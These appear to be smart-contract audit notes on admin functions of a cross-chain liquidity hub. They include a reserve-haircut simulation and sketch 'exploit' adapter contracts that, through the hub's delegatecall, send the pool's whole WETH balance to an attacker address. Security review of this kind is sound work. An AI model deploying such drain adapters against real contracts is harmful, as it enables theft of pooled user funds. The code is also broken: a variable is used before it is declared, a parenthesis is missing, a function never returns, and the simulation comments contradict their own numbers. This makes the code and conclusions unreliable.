### haircutReserves

```solidity
function haircutReserves(address l1Token, int256 haircutAmount) public onlyOwner nonReentrant {
    pooledTokens[l1Token].utilizedReserves -= haircutAmount;
}
```

1. we add liquidity, e.g. `l1TokenAmount = 100000` tokens, get `lpTokenAmount = (l1TokenAmount * 1e18) / _exchangeRateCurrent(l1Token)` lp tokens.
2. owner executes haircutReserves() and changes utilizedReserves
3. we remove liquidity and get `l1Tokens = (lpTokenAmount * _exchangeRateCurrent(l1Token)) / 1e18`


#### Simulation

```
get some onchain params for WETH contract:

address lpToken = 0x28F77208728B0A45cAb24c4868334581Fe86F95B
uint32 lastLpFeeUpdate = 1742478023
uint256 undistributedLpFees = 2495510634873076907
uint256 liquidReserves = 15593038486308420640717
int256 utilizedReserves = 3081310457640993279566
```


```solidity
contract Simulation {
    uint256 undistributedLpFees = 2495510634873076907;
    uint256 liquidReserves = 15593038486308420640717;
    uint256 totalSupply = 17029603465356381254203;
    int256 utilizedReserves = 3081310457640;  // can change

    function exchangeRate() public view returns (uint256) {
        // _updateAccumulatedLpFees(pooledToken); 
        // _sync(l1Token);

        int256 numerator = int256(liquidReserves) + utilizedReserves - int256(undistributedLpFees);
        return (uint256(numerator) * 1e18) / totalSupply;
    }

    function removeLiquidity(uint256 lpTokenAmount) external view returns (uint256) {
        uint256 l1TokensToReturn = (lpTokenAmount * exchangeRate()) / 1e18;
    }
}

// *** assume we have 100000 lpTokens:
// 1. int256 utilizedReserves = 3081310457640993279566
// 2. lpTokens = 100000
// 3. l1TokensToReturn = 109643

// *** increase utilizedReserves, haircutAmount < 0 -> we get more l1 tokens than deposited: 
// 1. int256 utilizedReserves = 3081310457640993279566000
// 2. lpTokens = 100000
// 3. l1TokensToReturn = 18185397

// *** increase utilizedReserves, haircutAmount < 0 -> we get less l1 tokens than deposited: 
// 1. int256 utilizedReserves = 3081310457640
// 2. lpTokens = 100000
// 3. l1TokensToReturn = 91549

// *** increase utilizedReserves, haircutAmount < 0 -> we get less l1 tokens than deposited: 
// *** !!! have saturation
// 1. int256 utilizedReserves = 308131045
// 2. lpTokens = 100000
// 3. l1TokensToReturn = 91549
```

> _updateAccumulatedLpFees(pooledToken) and _sync(l1Token)
> don't affect on exchangeRate, if only haircutReserves() was called
        


### setCrossChainContracts

```solidity
    function setCrossChainContracts(
        uint256 l2ChainId,
        address adapter,
        address spokePool
    ) public override onlyOwner nonReentrant {
        crossChainContracts[l2ChainId] = CrossChainContract(adapter, spokePool);
        emit CrossChainContractsSet(l2ChainId, adapter, spokePool);
    }
```

Here we can withdraw all tokens: here we do adapter.delegatecall.

```
// assume attacker = msg.sender

call trace:                                            who calls
setCrossChainContracts                                 msg.sender == owner
executeRootBundle                                      msg.sender == attacker
    _sendTokensToChainAndUpdatePooledTokenTrackers     msg.sender == attacker
        (bool success, ) = adapter.delegatecall(       msg.sender == attacker
                    abi.encodeWithSignature(
                        "relayTokens(address,address,uint256,address)",
                        l1Token, // l1Token.
                        l2Token, // l2Token.
                        uint256(netSendAmounts[i]), // amount.
                        spokePool // to. This should be the spokePool.
                    )
                );
```

Possible attack vector in single transaction (all liquidity is on Hub contract):
1. set new `adapter` in setCrossChainContracts
3. attacker calls executeRootBundle(inside we call internal function _sendTokensToChainAndUpdatePooledTokenTrackers()):
4. call `adapter`.delegatecall (in context of Hub contract):

```solidity
// Potential exploit function (this function is defined in new adapter contract)
contract Adapter {
    address immutable private EXPLOIT_ADDRESS;

    function relayTokens(address,address,uint256,address) {
        // msg.sender == attacker
        IERC20 token = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        // inside transfer() msg.sender == address(this), so can withdraw liquidity
        token.transfer(EXPLOIT_ADDRESS, token.balanceOf(address(this))); // msg.sender in approve is HUB
    }
}
```

### setDepositRoute (+relaySpokePoolAdminFunction)
```solidity
function setDepositRoute(
    uint256 originChainId,
    uint256 destinationChainId,
    address originToken,
    bool depositsEnabled
) public override nonReentrant onlyOwner {
    _relaySpokePoolAdminFunction(
        originChainId,
        abi.encodeWithSignature(
            "setEnableRoute(address,uint256,bool)",
            originToken,
            destinationChainId,
            depositsEnabled
        )
    );
    emit SetEnableDepositRoute(originChainId, destinationChainId, originToken, depositsEnabled);
}


function _relaySpokePoolAdminFunction(uint256 chainId, bytes memory functionData) internal {
    (address adapter, address spokePool) = _getInitializedCrossChainContracts(chainId);

    // Perform delegatecall to use the adapter's code with this contract's context.

    // We are ok with this low-level call since the adapter address is set by the admin and we've
    // already checked that its not the zero address.
    // solhint-disable-next-line avoid-low-level-calls
    (bool success, ) = adapter.delegatecall(
        abi.encodeWithSignature(
            "relayMessage(address,bytes)",
            spokePool, // target. This should be the spokePool on the L2.
            functionData
        )
    );
    require(success, "delegatecall failed");
    emit SpokePoolAdminFunctionTriggered(chainId, functionData);
}
```

Possible attack flow (in single tx):
1. set new `adapter` in setCrossChainContracts
2. attacker calls setDepositRoute(inside we call internal function _relaySpokePoolAdminFunction()):
3. call `adapter`.delegatecall (in context of Hub contract):

```solidity
// Potential exploit function (this function is defined in new adapter contract)
contract Adapter {
    address immutable private EXPLOIT_ADDRESS;

    function relayMessage(address,bytes) {
        // msg.sender == attacker
        address selfBalance = token.balanceOf(address(this));
        IERC20 token = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        // inside transfer() msg.sender == address(this), so can withdraw liquidity
        token.transfer(EXPLOIT_ADDRESS, token.balanceOf(selfBalance); // msg.sender in approve is HUB
    }
}
```

### setBond
```solidity
interface AddressWhitelistInterface {
    function addToWhitelist(address newElement) external;
    function removeFromWhitelist(address newElement) external;
    function isOnWhitelist(address newElement) external view returns (bool);
    function getWhitelist() external view returns (address[] memory);
}

function setBond(IERC20 newBondToken, uint256 newBondAmount)
    public
    override
    onlyOwner
    noActiveRequests
    nonReentrant
{
    require(newBondAmount != 0, "bond equal to final fee");

    AddressWhitelistInterface addressWhitelist = AddressWhitelistInterface(
        finder.getImplementationAddress(OracleInterfaces.CollateralWhitelist)
    );
    require(addressWhitelist.isOnWhitelist(address(newBondToken)), "Not on whitelist");

    bondToken = newBondToken;
    uint256 _bondAmount = newBondAmount + _getBondTokenFinalFee();
    bondAmount = _bondAmount;
    emit BondSet(address(newBondToken), _bondAmount);
}

```

At first glance it may seem that we can change interfacesImplemented[OracleInterfaces.CollateralWhitelist] value to exploit contract, but in new contract isOnWhitelist() function should be also view (can't change blockchain state), otherwise call will be reverted (if new isOnWhitelist() function is not readable).


```solidity
contract Finder is Ownable {

    mapping(bytes32 => address) public interfacesImplemented;

    event InterfaceImplementationChanged(bytes32 indexed interfaceName, address indexed newImplementationAddress);

    /**
     * @dev Updates the address of the contract that implements `interfaceName`.
     */
    function changeImplementationAddress(bytes32 interfaceName, address implementationAddress)
        external
        onlyOwner
    {
        interfacesImplemented[interfaceName] = implementationAddress;
        emit InterfaceImplementationChanged(interfaceName, implementationAddress);
    }
// ...
```

### setBond
No affects liquidity pool
